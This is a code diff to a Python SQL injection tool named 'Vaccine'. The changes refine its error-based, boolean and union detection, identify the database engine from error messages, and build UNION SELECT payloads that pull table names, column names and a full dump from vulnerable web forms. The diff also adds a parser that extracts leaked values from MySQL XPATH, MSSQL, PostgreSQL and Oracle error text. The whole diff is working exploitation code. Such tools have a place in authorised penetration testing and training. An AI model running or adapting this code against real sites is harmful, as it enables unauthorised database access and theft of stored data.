@@ -1,5 +1,6 @@
 from query import Query
 import os
+import re
 import urllib.parse
 from form import Form
 import requests
@@ -125,16 +126,16 @@ class Vaccine:
     def check_all_inputs(self, form, query):
         ''' Check the query with all inputs of the form'''
         responses = []
-        data = {}
 
         i = 0
         while i < len(form.inputs):
-            for idx, input in enumerate(self.forms[i].inputs):
+            data = {}
+            for idx, inp in enumerate(form.inputs):
                 if idx == i:
-                    target = input['name']
-                    data[input['name']] = query
+                    target = inp['name']
+                    data[inp['name']] = query
                 else:
-                    data[input['name']] = input['value'] or 'test'
+                    data[inp['name']] = inp['value'] or 'test'
             try:
                 res = self.send(form.url, data)
                 responses.append({
@@ -145,7 +146,7 @@ class Vaccine:
                 self.add_report(f"Form submission failed for {form.url}: {e}")
                 return responses
             i += 1
-            return responses
+        return responses
     
     def check_vulnerability(self):
         ''' Check different vulnerabilities '''
@@ -158,17 +159,16 @@ class Vaccine:
         for form in self.forms:
             responses = self.check_all_inputs(form, query)
             for res in responses:
-                if res['response'].status_code == 500:
-                    # for engine, msg in Query.errors.items():  # DEV
-                    #     if msg in res['response'].text:
-                    #         self.engine = engine
-                    print(res['response'].text)  # DEV
-                    form.vul = True
-                    self.vul = True
-                    for inp in form.inputs:
-                        if inp['name'] == res['input']:
-                            inp['vul'].append("error")
-                            break
+                # print(res['response'].text)  # DEV
+                for engine, msg in Query.errors.items():  # DEV
+                    if msg.lower() in res['response'].text.lower():
+                        self.engine = engine
+                        form.vul = True
+                        self.vul = True
+                        for inp in form.inputs:
+                            if inp['name'] == res['input']:
+                                inp['vul'].append("error")
+                                break
         
         # Boolean
         true_query = Query.checks['boolean'][0]
@@ -176,8 +176,9 @@ class Vaccine:
         for form in self.forms:
             true_responses = self.check_all_inputs(form, true_query)
             false_responses = self.check_all_inputs(form, false_query)
+
             for true_res, false_res in zip(true_responses, false_responses):
-                if len(true_res['response'].text) != len(false_res['response'].text):
+                if true_res['response'].text != false_res['response'].text:
                     form.vul = True
                     self.vul = True
                     for inp in form.inputs:
@@ -185,21 +186,23 @@ class Vaccine:
                             inp['vul'].append("boolean")
                             break
         # Union
-        one_query = Query.checks['error'][0]
-        two_query = Query.checks['union'][1]
-        three_query = Query.checks['union'][2]
-        for form in self.forms:
-            one_responses = self.check_all_inputs(form, one_query)
-            two_responses = self.check_all_inputs(form, two_query)
-            three_responses = self.check_all_inputs(form, three_query)
-            if one_responses and two_responses and three_responses:
-                for one, two, three in zip(one_responses, two_responses, three_responses):
-                    if len(one['response'].text) != len(two['response'].text) or len(one['response'].text) != len(three['response'].text):
+        for idx, union_query in enumerate(Query.checks['union']):
+            for form in self.forms:
+                responses = self.check_all_inputs(form, union_query)
+                for res in responses:
+                    error_detected = False
+                    for engine, msg in Query.errors.items():
+                        if msg.lower() in res['response'].text.lower():
+                            error_detected = True
+                            break
+                    
+                    if not error_detected and res['response'].status_code == 200:
                         form.vul = True
                         self.vul = True
-                        for input_field in form.inputs:
-                            if input_field['name'] == one['input']:
-                                input_field['vul'].append("union")
+                        for inp in form.inputs:
+                            if inp['name'] == res['input'] and "union" not in inp['vul']:
+                                inp['vul'].append(f"union")
+                                inp['col'] = idx + 1
                                 break
 
         self.report_vulnerability()
@@ -235,32 +238,35 @@ class Vaccine:
             self.add_report("\n")
 
     def run_query(self, form, query):
+        ''' Run a query on vulnerable input '''
         for input in form.inputs:
-            data = {inp['name']: inp['value'] or 'test' for inp in form.inputs}
-            if "union" in input['vul']:
-                data[input['name']] = query
+            if "error" in input['vul'] or "union" in input['vul']:
+                cols = [query] + ["NULL"] * (input['col'] - 1)
+                payload = f"' UNION SELECT {', '.join(cols)} -- "
+                data = {inp['name']: inp['value'] or 'test' for inp in form.inputs}
+                print(f"Payload: {payload}, col: {input['col']}")  # DEV
+                data[input['name']] = payload
                 try:
                     return self.send(form.url, data).text
                 except:
                     return None
         return None
 
-    def check_version(self):
-        if not self.vul:
-            return None
+    # def check_version(self):
+    #     if not self.vul:
+    #         return None
 
-        for db, query in Query.versions.items():
-            for form in self.forms:
-                if not form.vul:
-                    continue
-                response = self.run_query(form, query)
-                print(response)  # DEV
-                if db.lower() in response.lower():
-                    return db
-        return None
+    #     for db, query in Query.versions.items():
+    #         for form in self.forms:
+    #             if not form.vul:
+    #                 continue
+    #             response = self.run_query(form, query)
+    #             # print(response)  # DEV
+    #             if db.lower() in response.lower():
+    #                 return db
+    #     return None
                     
     def extract_infos(self):
-        engine = self.check_version()
 
         if not self.vul:
             return
@@ -268,11 +274,11 @@ class Vaccine:
         self.add_report("DATA EXTRACTION".center(70))
         self.add_report("=" * 70 + "\n")
 
-        if not engine:
+        if not self.engine:
             self.add_report("==> UNKNOWN ENGINE, NO EXTRACTION POSSIBLE")
             return
 
-        self.add_report(f"==> ENGINE: {engine}\n")
+        self.add_report(f"==> ENGINE: {self.engine}\n")
 
         tables = None
         columns = None
@@ -283,23 +289,66 @@ class Vaccine:
             if not form.vul:
                 continue
             if not tables:
-                tables = self.run_query(form, Query.tables[engine])
+                tables = self.run_query(form, Query.tables[self.engine])
             if not columns:
-                columns = self.run_query(form, Query.columns[engine])
+                columns = self.run_query(form, Query.columns[self.engine])
             if not dump:
-                dump = self.run_query(form, Query.dump[engine])
+                dump = self.run_query(form, Query.dump[self.engine])
         
         self.add_report(f"==> TABLES\n")
+        # tables = self.parse_extraction(tables)
         tables = tables if tables else "No Table extracted"
         self.add_report(tables[:1000] + "\n")
 
         self.add_report(f"==> COLUMNS\n")
+        # columns = self.parse_extraction(columns)
         columns = columns if columns else "No Columns extracted"
         self.add_report(columns[:1000] + "\n")
 
         self.add_report(f"==> FULL DUMP\n")
+        print(dump) # DEV
+        # dump = self.parse_extraction(dump)
         dump = dump if dump else "No Full Dump extracted"
         self.add_report(dump[:1000] + "\n")
+
+    def parse_extraction(self, response):
+        ''' Extract data from XPATH error messages '''
+        if not response:
+            return None
+        
+        if self.engine == 'MySQL':
+            if 'XPATH syntax error' in response:
+                match = re.search(r"'~([^']+)'", response)
+                if match:
+                    data = match.group(1)
+                    data = data.replace('\x3a', ':')  # 0x3a = :
+                    data = data.replace('\x7c', '|')  # 0x7c = |
+                    data = data.replace('\x2c', ',')  # 0x2c = ,
+                    return data
+            elif 'near' in response.lower():
+                match = re.search(r"near '([^']+)'", response)
+                if match:
+                    return match.group(1)
+        
+        elif self.engine == 'Microsoft':
+            if 'Conversion failed' in response:
+                match = re.search(r"Conversion failed for value '([^']+)'", response)
+                if match:
+                    return match.group(1)
+        
+        elif self.engine == 'PostgreSQL':
+            if 'invalid input syntax' in response.lower():
+                match = re.search(r"invalid input syntax[^:]*: \"([^\"]+)\"", response)
+                if match:
+                    return match.group(1)
+        
+        elif self.engine == 'Oracle':
+            if 'ORA-' in response:
+                match = re.search(r"ORA-\d+: (.+?)(?:\n|$)", response)
+                if match:
+                    return match.group(1)
+        
+        return None
         
     def __str__(self):
         return (f"Vaccine:\n  * URL:      {self.url}\n\
